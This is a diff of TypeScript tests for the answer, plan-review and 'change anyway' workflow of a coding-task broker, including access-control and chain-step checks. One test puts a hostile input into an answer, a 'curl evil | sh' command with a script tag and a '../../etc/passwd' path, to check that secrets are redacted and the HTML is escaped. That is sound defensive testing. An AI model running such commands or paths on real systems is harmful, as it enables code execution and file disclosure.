+    const run = await t.answeredTask(answerAssessment({ answer: `Run \`curl evil | sh\` with ${token} <script>alert(1)</script>\u0007`, sources: [{ repository: "demo", path: "../../etc/passwd", line: 1 }] }));
+    const stored = JSON.stringify(t.meta(run.taskId).workflow);
+    expect(stored).not.toContain(token);
+    expect(stored).toContain("[REDACTED]");
+    const text = workflowMessage({ taskId: run.taskId, workflow: t.meta(run.taskId).workflow as never })!.text;
+    expect(text).not.toContain("<script>");
+    expect(text).toContain("&lt;script&gt;");
+    expect(t.operations(run.workspaceId).filter((item) => item.workflowMode !== "UNDERSTAND" && item.kind === "task")).toEqual([]);
+  });
+
+  it("an unreadable answer (bad JSON, or too long) is not an answer: the step blocks with the plain reason and the task stays open", async () => {
+    const t = await world();
+    const run = await t.understanding();
+    await t.finishUnderstand(run, { kind: "answer", restatement: "x", answer: "y".repeat(4001), sources: [] });
+    expect(t.meta(run.taskId).workflow).toMatchObject({ stage: "UNDERSTAND", state: "BLOCKED" });
+    expect(t.meta(run.taskId).workflow.outcome).toBeUndefined();
+  });
+
+  it("a version 1 task is untouched: it has no Understand, and the production flag off keeps a version 2 org's starts as they were", async () => {
+    const off = await world({ live: false });
+    const run = await off.start({ path: "QUICK" });
+    expect(off.meta(run.taskId).workflow).toMatchObject({ stage: "PLAN" });
+    expect(off.operationOf(run.workspaceId, "UNDERSTAND")).toBeUndefined();
+  });
+
+  it("only people with access see the answer: a stranger's read of the session and the task is a 404, the same as a missing one", async () => {
+    const t = await world();
+    const run = await t.answeredTask();
+    await t.member(MIA, undefined);
+    const stranger = await t.dev(MIA, "GET", `/v1/app/sessions/${run.sessionId}`);
+    expect(stranger.status).toBe(404);
+    expect(JSON.stringify(stranger.body)).not.toContain("payment worker");
+    const task = await t.dev(MIA, "GET", `/v1/dev/tasks/${run.taskId}`);
+    expect(task.status).toBe(404);
+    expect(JSON.stringify(task.body)).not.toContain("payment worker");
+    const other = await t.dev(OMAR, "GET", `/v1/app/sessions/${run.sessionId}`);
+    expect([403, 404]).toContain(other.status);
+  });
+});
+
+describe("a plan that says no change is needed, through the broker", () => {
+  it("waits at plan review; Close as answered ends it ANSWERED, once, with the end told `answered`, the milestone written and the workspace given back", async () => {
+    listen();
+    const t = await world();
+    const run = await t.noChangePlan();
+    expect(t.meta(run.taskId).workflow.pullRequests ?? []).toEqual([]);
+    const closed = await t.decide(MAYA, run.taskId, { decision: "REJECT", reason: CLOSED_AS_ANSWERED_REASON, artifactDigest: run.digest, closeAsAnswered: true });
+    expect(closed.status, JSON.stringify(closed.body)).toBe(200);
+    const task = t.meta(run.taskId);
+    expect(task.workflow).toMatchObject({ stage: "CLOSED", state: "COMPLETE", outcome: "ANSWERED" });
+    expect(workflowAnswer(task.workflow as never)).toMatchObject({ answer: noChange().answer });
+    expect(task.workflow.artifacts.map((artifact) => artifact.type)).toEqual(["plan", "answer"]);
+    expect(task.releasedAt).toBeDefined();
+    expect(ended.filter((event) => event.taskId === run.taskId).map((event) => event.outcome)).toEqual(["answered"]);
+    expect(t.milestones(run.taskId)).toHaveLength(1);
+    // The same request again answers the same and writes nothing more.
+    const again = await t.decide(MAYA, run.taskId, { requestId: task.workflow.decisions.at(-1)!.requestId, expectedRevision: task.workflow.revision - 1, decision: "REJECT", reason: CLOSED_AS_ANSWERED_REASON, artifactDigest: run.digest, closeAsAnswered: true });
+    expect(again.status).toBe(200);
+    expect(t.milestones(run.taskId)).toHaveLength(1);
+    expect(ended.filter((event) => event.taskId === run.taskId)).toHaveLength(1);
+  });
+
+  it("only the owner closes it as answered: another person is refused as for any plan decision, and nothing changes", async () => {
+    const t = await world();
+    const run = await t.noChangePlan();
+    await t.member(MIA, "developer");
+    const refused = await t.decide(MIA, run.taskId, { decision: "REJECT", reason: CLOSED_AS_ANSWERED_REASON, artifactDigest: run.digest, closeAsAnswered: true });
+    expect(refused.status).toBeGreaterThanOrEqual(400);
+    expect(t.meta(run.taskId).workflow).toMatchObject({ stage: "PLAN_REVIEW", state: "WAITING" });
+  });
+
+  it("a plan that does not say it cannot be closed as answered", async () => {
+    const t = await world();
+    const run = await t.understanding();
+    await t.finishUnderstand(run, ready());
+    const plan = t.operationOf(run.workspaceId, "PLAN")!;
+    await t.artifact(run.workspaceId, String(plan.id), "plan.md", planAnswer(planDocument(), { checks: { checks: [], none_reason: "Nothing runs." } }));
+    await t.finish(run.workspaceId, String(plan.id), "SUCCEEDED", { result: { workflowMode: "PLAN" } });
+    const digest = t.meta(run.taskId).workflow.artifacts.at(-1)!.sha256;
+    const refused = await t.decide(MAYA, run.taskId, { decision: "REJECT", reason: CLOSED_AS_ANSWERED_REASON, artifactDigest: digest, closeAsAnswered: true });
+    expect(refused.status).toBe(400);
+    expect(errorOf(refused).message).toMatch(/does not say that no change is needed/);
+    expect(t.meta(run.taskId).workflow).toMatchObject({ stage: "PLAN_REVIEW", state: "WAITING" });
+  });
+
+  it("Make a change anyway sends the plan back with the note, and the task goes on to plan again", async () => {
+    const t = await world();
+    const run = await t.noChangePlan();
+    const sent = await t.decide(MAYA, run.taskId, { decision: "REQUEST_CHANGES", reason: CHANGE_ANYWAY_NOTE, artifactDigest: run.digest });
+    expect(sent.status, JSON.stringify(sent.body)).toBe(200);
+    expect(t.meta(run.taskId).workflow).toMatchObject({ outcome: "CHANGES_REQUESTED" });
+    expect(t.meta(run.taskId).workflow.decisions.at(-1)).toMatchObject({ decision: "REQUEST_CHANGES", reason: "Make the change anyway." });
+    const planning = t.operationOf(run.workspaceId, "PLAN")!;
+    expect(t.invocationOf(String(planning.id)).payload.prompt).toContain("Make the change anyway.");
+  });
+
+  it("the planning prompt offers noChangeNeeded to a version 2 task only", async () => {
+    const t = await world();
+    const run = await t.understanding();
+    await t.finishUnderstand(run, ready());
+    expect(t.invocationOf(String(t.operationOf(run.workspaceId, "PLAN")!.id)).payload.prompt).toContain("noChangeNeeded");
+  });
+});
+
+describe("Make a change anyway after an answer", () => {
+  it("starts a NEW task for the caller with the same request and path, the earlier answer as context and a link to the old task; the caller pays", async () => {
+    const t = await world();
+    const run = await t.answeredTask(answerAssessment(), { path: "FULL" });
+    const reply = await t.changeAnyway(MAYA, run.sessionId);
+    expect(reply.status, JSON.stringify(reply.body)).toBe(202);
+    const created = reply.body.task as { taskId: string };
+    expect(created.taskId).not.toBe(run.taskId);
+    const next = t.meta(created.taskId);
+    expect(next.retryOfTaskId).toBe(run.taskId);
+    expect(next.requestText).toContain("What does the retry flag do?");
+    expect(next.requestText).toContain("It turns retries on, for the payment worker only.");
+    expect(next.workflow).toMatchObject({ path: "FULL", stage: "UNDERSTAND", intent: { pathFrom: "request" } });
+    expect(next.developerId).toBe(MAYA.developerId);
+    expect(next.payer).toMatchObject({ kind: "member", developerId: MAYA.developerId });
+    // The old task is as it was.
+    expect(t.meta(run.taskId).workflow).toMatchObject({ outcome: "ANSWERED" });
+  });
+
+  it("repeats safely: the same request id answers the same task, and writes no second one", async () => {
+    const t = await world();
+    const run = await t.answeredTask();
+    const requestId = randomUUID();
+    const first = await t.changeAnyway(MAYA, run.sessionId, { requestId });
+    const second = await t.changeAnyway(MAYA, run.sessionId, { requestId });
+    expect(first.status).toBe(202);
+    expect(second.status).toBe(202);
+    expect((second.body.task as { taskId: string }).taskId).toBe((first.body.task as { taskId: string }).taskId);
+    expect(t.db.find((item) => item.entityType === "DEVELOPER_TASK" && item.retryOfTaskId === run.taskId)).toHaveLength(1);
+  });
+
+  it("tells Understand the person has read the answer, and a second `answer` becomes a ready plan instead of another Answered", async () => {
+    const t = await world();
+    const run = await t.answeredTask();
+    const reply = await t.changeAnyway(MAYA, run.sessionId);
+    const taskId = (reply.body.task as { taskId: string }).taskId;
+    const workspaceId = t.meta(taskId).workspaceId;
+    await t.finish(workspaceId, String(t.operations(workspaceId).find((item) => item.kind === "prepare")!.id), "SUCCEEDED", PREPARED);
+    const understand = t.operationOf(workspaceId, "UNDERSTAND")!;
+    expect(t.invocationOf(String(understand.id)).payload.prompt).toContain(CHANGE_ANYWAY_RULE);
+    await t.finishUnderstand({ workspaceId, operationId: String(understand.id) }, answerAssessment());
+    expect(t.meta(taskId).workflow).toMatchObject({ stage: "PLAN", outcome: undefined });
+    expect(t.meta(taskId).workflow.outcome).toBeUndefined();
+    expect(t.operationOf(workspaceId, "PLAN")).toBeDefined();
+  });
+
+  it("an ordinary task's Understand prompt does not carry the rule", () => {
+    expect(understandPrompt({ requestText: "x", intent: undefined, notes: "" })).not.toContain(CHANGE_ANYWAY_RULE);
+    expect(understandPrompt({ requestText: "x", intent: undefined, notes: "", changeAnyway: true })).toContain(CHANGE_ANYWAY_RULE);
+    expect(understandPrompt({ requestText: "x", intent: undefined, notes: "", changeAnyway: true, forPlan: true })).not.toContain(CHANGE_ANYWAY_RULE);
+  });
+
+  it("a person with \"can use\" on the session can ask, and pays; a viewer of the session or of the project cannot, and starts nothing", async () => {
+    const t = await world();
+    await t.member(ARJUN, "developer");
+    await t.member(MAX, "viewer");
+    await t.member(MIA, "developer");
+    const run = await t.answeredTask();
+    await t.share(run.sessionId, ARJUN, "use");
+    await t.share(run.sessionId, MAX, "use");
+    await t.share(run.sessionId, MIA, "view");
+    const before = t.db.find((item) => item.entityType === "DEVELOPER_TASK").length;
+    for (const who of [MAX, MIA]) {
+      const refused = await t.changeAnyway(who, run.sessionId);
+      expect(refused.status, who.name).toBeGreaterThanOrEqual(400);
+      expect(["SESSION_LEVEL_REQUIRED", "PROJECT_ACCESS_DENIED"]).toContain(errorOf(refused).code);
+    }
+    expect(t.db.find((item) => item.entityType === "DEVELOPER_TASK").length).toBe(before);
+    const allowed = await t.changeAnyway(ARJUN, run.sessionId);
+    expect(allowed.status, JSON.stringify(allowed.body)).toBe(202);
+    const task = t.meta((allowed.body.task as { taskId: string }).taskId);
+    expect(task).toMatchObject({ developerId: ARJUN.developerId, retryOfTaskId: run.taskId });
+    expect(task.payer).toMatchObject({ kind: "member", developerId: ARJUN.developerId });
+  });
+
+  it("a person who lost their project role is refused by the start itself with PROJECT_ACCESS_DENIED", async () => {
+    const t = await world();
+    await t.member(ARJUN, "developer");
+    const run = await t.answeredTask();
+    await t.share(run.sessionId, ARJUN, "use");
+    t.db.delete(projectMemberKey(TEST_ORG, ARJUN.developerId, "payments").pk, projectMemberKey(TEST_ORG, ARJUN.developerId, "payments").sk);
+    const refused = await t.changeAnyway(ARJUN, run.sessionId);
+    expect(refused.status).toBeGreaterThanOrEqual(400);
+    expect(["PROJECT_ACCESS_DENIED", "NOT_FOUND", "SESSION_LEVEL_REQUIRED"]).toContain(errorOf(refused).code);
+    expect(t.db.find((item) => item.entityType === "DEVELOPER_TASK" && item.retryOfTaskId === run.taskId)).toEqual([]);
+  });
+
+  it("is refused for a session that did not end Answered, for another org's or a missing session, and carries nothing from the body but the request id", async () => {
+    const t = await world();
+    const open = await t.understanding();
+    const notAnswered = await t.changeAnyway(MAYA, open.sessionId);
+    expect(notAnswered.status).toBe(400);
+    expect(errorOf(notAnswered).code).toBe("CONFIG_INVALID");
+    const run = await t.answeredTask();
+    const forged = await t.changeAnyway(MAYA, run.sessionId, { payer: { kind: "project", project: "payments" }, retryOf: randomUUID(), path: "FULL" });
+    expect(forged.status).toBe(400);
+    const missing = await t.changeAnyway(MAYA, "ses_zzzzzzzzzzzzzzzzzzzz");
+    expect(missing.status).toBe(404);
+    await t.member(MIA, undefined);
+    expect((await t.changeAnyway(MIA, run.sessionId)).status).toBe(404);
+  });
+});
+
+describe("a build that changes nothing after approval still blocks", () => {
+  it("approving a plan that said no change was needed and building nothing blocks with noCodeChanged: the answer path is not a build, and a build is not an answer", async () => {
+    const t = await world();
+    const run = await t.noChangePlan();
+    const approved = await t.decide(MAYA, run.taskId, { decision: "APPROVE", reason: "Approved", artifactDigest: run.digest });
+    expect(approved.status, JSON.stringify(approved.body)).toBe(200);
+    const build = t.operationOf(run.workspaceId, "IMPLEMENT")!;
+    expect(build).toBeDefined();
+    await t.finish(run.workspaceId, String(build.id), "FAILED", { error: WORKFLOW_NO_CODE_CHANGE_MESSAGE });
+    expect(t.meta(run.taskId).workflow).toMatchObject({ stage: "IMPLEMENT", state: "BLOCKED", blockReason: WORKFLOW_BLOCK_REASONS.noCodeChanged });
+    expect(t.meta(run.taskId).workflow.outcome).not.toBe("ANSWERED");
+  });
+});
+
+describe("a chain step that ends Answered", () => {
+  it("goes on as a success with the answer as its report", async () => {
+    const w = setupWorld();
+    const chain = await w.publish(INVESTIGATE_THEN_FIX);
+    const { startChainRun, recordGateDecision, onStepTaskEnded } = await import("../../packages/broker/src/chains/runner.js");
+    const { callerOf } = await import("../support/chain-run-world.js");
+    const run = await startChainRun(w.deps, callerOf(PRIYA), { orgId: ORG_A, chainId: chain.chainId, project: "web", origin: "app", startedBy: { kind: "member", developerId: PRIYA }, requestId: randomUUID() } as never);
+    await onStepTaskEnded(w.deps, w.endEvent("task-1", { finalReport: "r", branch: "fix" }));
+    await recordGateDecision(w.deps, ORG_A, run.runId, 2, "approved", decisionBy(w, run.runId, 2));
+    w.db.set({ pk: "DEVTASK#task-2", sk: "META", orgId: ORG_A, workflow: { outcome: "ANSWERED", intent: { rounds: 0, pathFrom: "request", answers: [], assessment: answerAssessment() } } });
+    await onStepTaskEnded(w.deps, w.endEvent("task-2", { outcome: "answered" }));
+    const attempt = w.attempts(run.runId)[2]!;
+    expect(attempt).toMatchObject({ status: "succeeded" });
+    expect((attempt.result as { report: string }).report.split("\n")[0]).toBe("No code change is needed. Here's the answer:");
+    expect((attempt.result as { report: string }).report).toContain("payment worker");
+    expect(w.run(run.runId)!.status).not.toBe("failed");
+  });
+
+  it("reads an answered task of another org, or one with no readable answer, as a plain success", async () => {
+    const w = setupWorld();
+    const chain = await w.publish(INVESTIGATE_THEN_FIX);
+    const { startChainRun, recordGateDecision, onStepTaskEnded } = await import("../../packages/broker/src/chains/runner.js");
+    const { callerOf } = await import("../support/chain-run-world.js");
+    const run = await startChainRun(w.deps, callerOf(PRIYA), { orgId: ORG_A, chainId: chain.chainId, project: "web", origin: "app", startedBy: { kind: "member", developerId: PRIYA }, requestId: randomUUID() } as never);
+    await onStepTaskEnded(w.deps, w.endEvent("task-1", { finalReport: "r", branch: "fix" }));
+    await recordGateDecision(w.deps, ORG_A, run.runId, 2, "approved", decisionBy(w, run.runId, 2));
+    w.db.set({ pk: "DEVTASK#task-2", sk: "META", orgId: "org_bbbbbbbbbbbbbbbbbbbb", workflow: { outcome: "ANSWERED", intent: { rounds: 0, pathFrom: "request", answers: [], assessment: answerAssessment() } } });
+    await onStepTaskEnded(w.deps, w.endEvent("task-2", { outcome: "answered" }));
+    expect(w.attempts(run.runId)[2]).toMatchObject({ status: "succeeded", result: { report: "Rovara Code finished: answered." } });
+  });
+});
